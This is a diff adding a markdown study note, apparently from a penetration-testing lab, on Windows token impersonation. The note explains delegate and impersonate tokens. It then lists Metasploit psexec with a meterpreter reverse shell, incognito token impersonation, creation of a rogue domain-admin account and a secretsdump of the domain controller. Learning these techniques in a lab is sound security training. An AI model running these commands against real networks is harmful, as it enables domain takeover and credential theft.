@@ -1,0 +1,28 @@
+# Token Impersonation
+
+- Token - temporary keys (like cookies in a browser) that allow you to access system/network without providing credentials each time
+    - two types
+        - delegate -created for logging into a machine using Remote Desktop
+        - impersonate - non-interactive such as attaching a network drive or a domain logon script
+- Attack
+    - Use metasploit
+        - msfconsole
+    - search psexec
+        - use 24
+    - set payload windows/x64/meterpreter/reverse_tcp
+    - set rhosts <target_ip>
+    - set smbuser fcastle
+    - set smbpass Password1
+    - set smbdomain MARVEL.local
+    - exploit
+    - SHELL GAINED
+    - load incognito
+    - list_tokens -u
+    - impersonate_token marvel\\fcastle
+        - Now we are fcastle
+- Now Admin
+    - impersonate_token MARVEL\\administrator
+    - net user /add hawkeye Password1@ /domain
+    - net group “Domain Admins” hawkeye /ADD /DOMAIN
+    - once the user is added as a domain admin, we can secrets dump the DC
+        - [secretsdump.py](http://secretsdump.py) MARVEL.local/hawkeye:’Password1@’@<dc_ip>
